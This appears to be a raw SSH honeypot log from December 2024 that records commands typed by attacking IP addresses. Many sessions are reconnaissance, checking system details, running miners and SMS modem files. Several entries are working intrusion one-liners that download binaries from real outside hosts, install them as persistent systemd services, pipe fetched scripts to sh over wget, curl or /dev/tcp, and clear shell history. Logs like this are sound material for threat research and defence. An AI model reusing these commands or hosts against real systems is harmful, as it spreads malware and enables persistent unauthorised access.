+2024-12-08 15:05:17.451929 - ('195.178.110.6', 38358) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 17:42:22.613584 - ('212.45.248.93', 39216) - uname -a
+2024-12-08 19:40:54.678246 - ('180.225.156.143', 35873) - /ip cloud print
+2024-12-08 19:40:56.289889 - ('180.225.156.143', 35873) - ifconfig
+2024-12-08 19:40:57.612361 - ('180.225.156.143', 35873) - uname -a
+2024-12-08 19:40:58.931926 - ('180.225.156.143', 35873) - cat /proc/cpuinfo
+2024-12-08 19:41:00.248908 - ('180.225.156.143', 35873) - ps | grep '[Mm]iner'
+2024-12-08 19:41:01.575269 - ('180.225.156.143', 35873) - ps -ef | grep '[Mm]iner'
+2024-12-08 19:41:02.892271 - ('180.225.156.143', 35873) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 19:41:04.207616 - ('180.225.156.143', 35873) - echo Hi | cat -n
+2024-12-08 20:06:23.691532 - ('195.178.110.6', 52202) - apt
+2024-12-08 20:06:24.272293 - ('195.178.110.6', 52202) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 20:06:29.781745 - ('195.178.110.6', 52208) - apt
+2024-12-08 20:06:30.934929 - ('195.178.110.6', 52208) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 20:06:36.432645 - ('195.178.110.6', 35566) - apt
+2024-12-08 20:06:36.994486 - ('195.178.110.6', 35566) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-08 20:07:16.360014 - ('115.141.77.39', 52986) - /ip cloud print
+2024-12-08 20:07:17.991983 - ('115.141.77.39', 52986) - ifconfig
+2024-12-08 20:07:19.336498 - ('115.141.77.39', 52986) - uname -a
+2024-12-08 20:07:20.675987 - ('115.141.77.39', 52986) - cat /proc/cpuinfo
+2024-12-08 20:07:22.016417 - ('115.141.77.39', 52986) - ps | grep '[Mm]iner'
+2024-12-08 20:07:23.356012 - ('115.141.77.39', 52986) - ps -ef | grep '[Mm]iner'
+2024-12-08 20:07:24.700046 - ('115.141.77.39', 52986) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 20:07:26.040003 - ('115.141.77.39', 52986) - echo Hi | cat -n
+2024-12-08 21:50:57.950033 - ('124.48.49.102', 33303) - /ip cloud print
+2024-12-08 21:50:59.536097 - ('124.48.49.102', 33303) - ifconfig
+2024-12-08 21:51:00.839964 - ('124.48.49.102', 33303) - uname -a
+2024-12-08 21:51:02.143700 - ('124.48.49.102', 33303) - cat /proc/cpuinfo
+2024-12-08 21:51:03.451549 - ('124.48.49.102', 33303) - ps | grep '[Mm]iner'
+2024-12-08 21:51:04.755511 - ('124.48.49.102', 33303) - ps -ef | grep '[Mm]iner'
+2024-12-08 21:51:06.063461 - ('124.48.49.102', 33303) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 21:51:07.367565 - ('124.48.49.102', 33303) - echo Hi | cat -n
+2024-12-08 21:51:57.199738 - ('94.19.104.188', 43506) - scp -t /tmp/VqBk8HFt
+2024-12-08 21:51:58.128352 - ('94.19.104.188', 43504) - scp -t /tmp/VqBk8HFt
+2024-12-08 22:07:15.025829 - ('116.40.77.66', 56443) - /ip cloud print
+2024-12-08 22:07:16.700167 - ('116.40.77.66', 56443) - ifconfig
+2024-12-08 22:07:18.079118 - ('116.40.77.66', 56443) - uname -a
+2024-12-08 22:07:19.456783 - ('116.40.77.66', 56443) - cat /proc/cpuinfo
+2024-12-08 22:07:20.826251 - ('116.40.77.66', 56443) - ps | grep '[Mm]iner'
+2024-12-08 22:07:22.194343 - ('116.40.77.66', 56443) - ps -ef | grep '[Mm]iner'
+2024-12-08 22:07:23.563800 - ('116.40.77.66', 56443) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 22:07:24.942708 - ('116.40.77.66', 56443) - echo Hi | cat -n
+2024-12-08 23:14:22.068597 - ('212.45.248.93', 24180) - uname -a
+2024-12-08 23:15:35.053052 - ('212.45.248.93', 58416) - uname -a
+2024-12-08 23:16:17.073065 - ('212.45.248.93', 46888) - uname -a
+2024-12-08 23:35:37.055563 - ('124.48.48.104', 43844) - /ip cloud print
+2024-12-08 23:35:38.661713 - ('124.48.48.104', 43844) - ifconfig
+2024-12-08 23:35:39.981761 - ('124.48.48.104', 43844) - uname -a
+2024-12-08 23:35:41.301831 - ('124.48.48.104', 43844) - cat /proc/cpuinfo
+2024-12-08 23:35:42.621575 - ('124.48.48.104', 43844) - ps | grep '[Mm]iner'
+2024-12-08 23:35:43.941404 - ('124.48.48.104', 43844) - ps -ef | grep '[Mm]iner'
+2024-12-08 23:35:45.261436 - ('124.48.48.104', 43844) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-08 23:35:46.581358 - ('124.48.48.104', 43844) - echo Hi | cat -n
+2024-12-09 02:11:18.637455 - ('122.33.81.152', 38257) - /ip cloud print
+2024-12-09 02:11:20.272843 - ('122.33.81.152', 38257) - ifconfig
+2024-12-09 02:11:21.616831 - ('122.33.81.152', 38257) - uname -a
+2024-12-09 02:11:22.960799 - ('122.33.81.152', 38257) - cat /proc/cpuinfo
+2024-12-09 02:11:24.304775 - ('122.33.81.152', 38257) - ps | grep '[Mm]iner'
+2024-12-09 02:11:25.648594 - ('122.33.81.152', 38257) - ps -ef | grep '[Mm]iner'
+2024-12-09 02:11:26.992848 - ('122.33.81.152', 38257) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-09 02:11:28.336630 - ('122.33.81.152', 38257) - echo Hi | cat -n
+2024-12-10 00:17:45.884370 - ('45.148.10.203', 35374) - apt
+2024-12-10 00:17:46.068504 - ('45.148.10.203', 35374) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 00:46:37.331409 - ('87.120.113.231', 41228) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-12-10 01:43:07.333407 - ('119.68.7.179', 52758) - /ip cloud print
+2024-12-10 01:43:09.017373 - ('119.68.7.179', 52758) - ifconfig
+2024-12-10 01:43:10.401743 - ('119.68.7.179', 52758) - uname -a
+2024-12-10 01:43:11.785710 - ('119.68.7.179', 52758) - cat /proc/cpuinfo
+2024-12-10 01:43:13.173697 - ('119.68.7.179', 52758) - ps | grep '[Mm]iner'
+2024-12-10 01:43:14.557834 - ('119.68.7.179', 52758) - ps -ef | grep '[Mm]iner'
+2024-12-10 01:43:15.941837 - ('119.68.7.179', 52758) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 01:43:17.325912 - ('119.68.7.179', 52758) - echo Hi | cat -n
+2024-12-10 02:25:17.468353 - ('122.33.203.198', 55209) - /ip cloud print
+2024-12-10 02:25:19.060150 - ('122.33.203.198', 55209) - ifconfig
+2024-12-10 02:25:20.368240 - ('122.33.203.198', 55209) - uname -a
+2024-12-10 02:25:21.683968 - ('122.33.203.198', 55209) - cat /proc/cpuinfo
+2024-12-10 02:25:22.996036 - ('122.33.203.198', 55209) - ps | grep '[Mm]iner'
+2024-12-10 02:25:24.311935 - ('122.33.203.198', 55209) - ps -ef | grep '[Mm]iner'
+2024-12-10 02:25:25.619747 - ('122.33.203.198', 55209) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 02:25:26.927503 - ('122.33.203.198', 55209) - echo Hi | cat -n
+2024-12-10 02:37:44.135269 - ('195.178.110.6', 56824) - apt
+2024-12-10 02:37:44.336044 - ('195.178.110.6', 56824) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 02:37:48.787526 - ('195.178.110.6', 56838) - apt
+2024-12-10 02:37:49.003805 - ('195.178.110.6', 56838) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 02:37:53.388345 - ('195.178.110.6', 51190) - apt
+2024-12-10 02:37:53.579924 - ('195.178.110.6', 51190) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 03:00:47.348159 - ('119.68.175.2', 55709) - /ip cloud print
+2024-12-10 03:00:48.955427 - ('119.68.175.2', 55709) - ifconfig
+2024-12-10 03:00:50.275305 - ('119.68.175.2', 55709) - uname -a
+2024-12-10 03:00:51.595125 - ('119.68.175.2', 55709) - cat /proc/cpuinfo
+2024-12-10 03:00:52.919062 - ('119.68.175.2', 55709) - ps | grep '[Mm]iner'
+2024-12-10 03:00:54.239036 - ('119.68.175.2', 55709) - ps -ef | grep '[Mm]iner'
+2024-12-10 03:00:55.558874 - ('119.68.175.2', 55709) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 03:00:56.886664 - ('119.68.175.2', 55709) - echo Hi | cat -n
+2024-12-10 03:06:08.630934 - ('119.68.148.107', 40100) - /ip cloud print
+2024-12-10 03:06:10.287913 - ('119.68.148.107', 40100) - ifconfig
+2024-12-10 03:06:11.647962 - ('119.68.148.107', 40100) - uname -a
+2024-12-10 03:06:13.013443 - ('119.68.148.107', 40100) - cat /proc/cpuinfo
+2024-12-10 03:06:14.376294 - ('119.68.148.107', 40100) - ps | grep '[Mm]iner'
+2024-12-10 03:06:15.741697 - ('119.68.148.107', 40100) - ps -ef | grep '[Mm]iner'
+2024-12-10 03:06:17.112701 - ('119.68.148.107', 40100) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 03:06:18.475621 - ('119.68.148.107', 40100) - echo Hi | cat -n
+2024-12-10 03:14:12.646675 - ('61.37.207.36', 46783) - /ip cloud print
+2024-12-10 03:14:14.077972 - ('61.37.207.36', 46783) - ifconfig
+2024-12-10 03:14:15.250030 - ('61.37.207.36', 46783) - uname -a
+2024-12-10 03:14:16.426009 - ('61.37.207.36', 46783) - cat /proc/cpuinfo
+2024-12-10 03:14:17.597794 - ('61.37.207.36', 46783) - ps | grep '[Mm]iner'
+2024-12-10 03:14:18.765744 - ('61.37.207.36', 46783) - ps -ef | grep '[Mm]iner'
+2024-12-10 03:14:19.937675 - ('61.37.207.36', 46783) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 03:14:21.109660 - ('61.37.207.36', 46783) - echo Hi | cat -n
+2024-12-10 03:38:45.244393 - ('195.178.110.34', 46882) - apt
+2024-12-10 03:38:45.545168 - ('195.178.110.34', 46882) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 03:38:49.943626 - ('195.178.110.34', 46894) - apt
+2024-12-10 03:38:50.167055 - ('195.178.110.34', 46894) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 03:38:54.783686 - ('195.178.110.34', 56010) - apt
+2024-12-10 03:38:55.504545 - ('195.178.110.34', 56010) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 05:16:14.870691 - ('87.120.113.231', 59694) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
+
+2024-12-10 05:28:20.146427 - ('211.119.232.23', 53520) - /ip cloud print
+2024-12-10 05:28:21.586310 - ('211.119.232.23', 53520) - ifconfig
+2024-12-10 05:28:22.778145 - ('211.119.232.23', 53520) - uname -a
+2024-12-10 05:28:23.958406 - ('211.119.232.23', 53520) - cat /proc/cpuinfo
+2024-12-10 05:28:25.142349 - ('211.119.232.23', 53520) - ps | grep '[Mm]iner'
+2024-12-10 05:28:26.323278 - ('211.119.232.23', 53520) - ps -ef | grep '[Mm]iner'
+2024-12-10 05:28:27.510192 - ('211.119.232.23', 53520) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 05:28:28.694255 - ('211.119.232.23', 53520) - echo Hi | cat -n
+2024-12-10 06:12:51.235711 - ('45.148.10.203', 34064) - apt
+2024-12-10 06:12:51.411259 - ('45.148.10.203', 34064) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 08:29:53.470547 - ('195.178.110.6', 44878) - apt
+2024-12-10 08:29:53.691732 - ('195.178.110.6', 44878) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 08:29:58.084668 - ('195.178.110.6', 44890) - apt
+2024-12-10 08:29:58.277703 - ('195.178.110.6', 44890) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 09:35:25.053270 - ('125.186.58.100', 47027) - /ip cloud print
+2024-12-10 09:35:26.684323 - ('125.186.58.100', 47027) - ifconfig
+2024-12-10 09:35:28.023998 - ('125.186.58.100', 47027) - uname -a
+2024-12-10 09:35:29.367924 - ('125.186.58.100', 47027) - cat /proc/cpuinfo
+2024-12-10 09:35:30.710562 - ('125.186.58.100', 47027) - ps | grep '[Mm]iner'
+2024-12-10 09:35:32.051896 - ('125.186.58.100', 47027) - ps -ef | grep '[Mm]iner'
+2024-12-10 09:35:33.391763 - ('125.186.58.100', 47027) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 09:35:34.743489 - ('125.186.58.100', 47027) - echo Hi | cat -n
+2024-12-10 10:19:45.134930 - ('122.33.81.152', 35521) - /ip cloud print
+2024-12-10 10:19:46.801069 - ('122.33.81.152', 35521) - ifconfig
+2024-12-10 10:19:48.170684 - ('122.33.81.152', 35521) - uname -a
+2024-12-10 10:19:49.536818 - ('122.33.81.152', 35521) - cat /proc/cpuinfo
+2024-12-10 10:19:50.900829 - ('122.33.81.152', 35521) - ps | grep '[Mm]iner'
+2024-12-10 10:19:52.268746 - ('122.33.81.152', 35521) - ps -ef | grep '[Mm]iner'
+2024-12-10 10:19:53.640633 - ('122.33.81.152', 35521) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 10:19:55.004607 - ('122.33.81.152', 35521) - echo Hi | cat -n
+2024-12-10 10:52:05.185622 - ('195.178.110.6', 48750) - apt
+2024-12-10 10:52:05.407265 - ('195.178.110.6', 48750) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 10:52:17.285678 - ('195.178.110.6', 53928) - apt
+2024-12-10 10:52:20.490095 - ('195.178.110.6', 53928) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 10:52:29.283742 - ('195.178.110.6', 60272) - apt
+2024-12-10 10:52:33.483362 - ('195.178.110.6', 60272) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 11:21:05.736493 - ('122.41.1.13', 56762) - /ip cloud print
+2024-12-10 11:21:07.324905 - ('122.41.1.13', 56762) - ifconfig
+2024-12-10 11:21:08.628292 - ('122.41.1.13', 56762) - uname -a
+2024-12-10 11:21:09.934823 - ('122.41.1.13', 56762) - cat /proc/cpuinfo
+2024-12-10 11:21:11.236579 - ('122.41.1.13', 56762) - ps | grep '[Mm]iner'
+2024-12-10 11:21:12.540080 - ('122.41.1.13', 56762) - ps -ef | grep '[Mm]iner'
+2024-12-10 11:21:13.839951 - ('122.41.1.13', 56762) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 11:21:15.148050 - ('122.41.1.13', 56762) - echo Hi | cat -n
+2024-12-10 12:07:35.494129 - ('45.148.10.203', 38256) - apt
+2024-12-10 12:07:35.674979 - ('45.148.10.203', 38256) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 12:54:33.770893 - ('124.48.117.30', 36841) - /ip cloud print
+2024-12-10 12:54:35.385867 - ('124.48.117.30', 36841) - ifconfig
+2024-12-10 12:54:36.712556 - ('124.48.117.30', 36841) - uname -a
+2024-12-10 12:54:38.042129 - ('124.48.117.30', 36841) - cat /proc/cpuinfo
+2024-12-10 12:54:39.370320 - ('124.48.117.30', 36841) - ps | grep '[Mm]iner'
+2024-12-10 12:54:40.700146 - ('124.48.117.30', 36841) - ps -ef | grep '[Mm]iner'
+2024-12-10 12:54:42.034966 - ('124.48.117.30', 36841) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 12:54:43.364098 - ('124.48.117.30', 36841) - echo Hi | cat -n
+2024-12-10 13:05:27.956974 - ('184.83.245.97', 49060) - /ip cloud print
+2024-12-10 13:05:28.941229 - ('184.83.245.97', 49060) - ifconfig
+2024-12-10 13:05:29.784568 - ('184.83.245.97', 49060) - uname -a
+2024-12-10 13:05:31.401400 - ('184.83.245.97', 49060) - cat /proc/cpuinfo
+2024-12-10 13:05:33.035445 - ('184.83.245.97', 49060) - ps | grep '[Mm]iner'
+2024-12-10 13:05:34.239631 - ('184.83.245.97', 49060) - ps -ef | grep '[Mm]iner'
+2024-12-10 13:05:35.447152 - ('184.83.245.97', 49060) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2024-12-10 13:05:36.467371 - ('184.83.245.97', 49060) - echo Hi | cat -n
+2024-12-10 13:34:15.401183 - ('218.92.0.132', 43264) - #!/bin/sh
+PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+wget http://43.249.172.195:888/112
+curl -O http://43.249.172.195:888/112
+chmod +x 112
+./112
+wget http://43.249.172.195:888/112s
+curl -O http://43.249.172.195:888/112s
+chmod +x 112s
+./112s
+rm -rf 112.sh
+rm -rf 112
+rm -rf 112s
+history -c
+
+2024-12-10 13:34:16.987149 - ('218.92.0.132', 43264) - ls -la /var/run/gcc.pid
+2024-12-10 17:21:12.793168 - ('45.148.10.46', 38388) - apt
+2024-12-10 17:21:13.295302 - ('45.148.10.46', 38388) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:21:23.106181 - ('45.148.10.46', 38398) - apt
+2024-12-10 17:21:24.487976 - ('45.148.10.46', 38398) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:21:30.487517 - ('45.148.10.46', 56732) - apt
+2024-12-10 17:21:31.697697 - ('45.148.10.46', 56732) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:21:39.687687 - ('45.148.10.46', 56746) - apt
+2024-12-10 17:21:40.185875 - ('45.148.10.46', 56746) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:21:48.903342 - ('45.148.10.46', 46742) - apt
+2024-12-10 17:21:50.292639 - ('45.148.10.46', 46742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:21:58.289817 - ('45.148.10.46', 53050) - apt
+2024-12-10 17:21:58.986754 - ('45.148.10.46', 53050) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:22:07.786501 - ('45.148.10.46', 55146) - apt
+2024-12-10 17:22:08.389779 - ('45.148.10.46', 55146) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:22:18.485788 - ('45.148.10.46', 47006) - apt
+2024-12-10 17:22:19.493492 - ('45.148.10.46', 47006) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 17:22:27.287759 - ('45.148.10.46', 56578) - apt
+2024-12-10 17:22:29.484962 - ('45.148.10.46', 56578) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
+
+2024-12-10 18:03:03.850811 - ('122.38.46.199', 46560) - /ip cloud print
+2024-12-10 18:03:05.526247 - ('122.38.46.199', 46560) - ifconfig
+2024-12-10 18:03:06.907291 - ('122.38.46.199', 46560) - uname -a
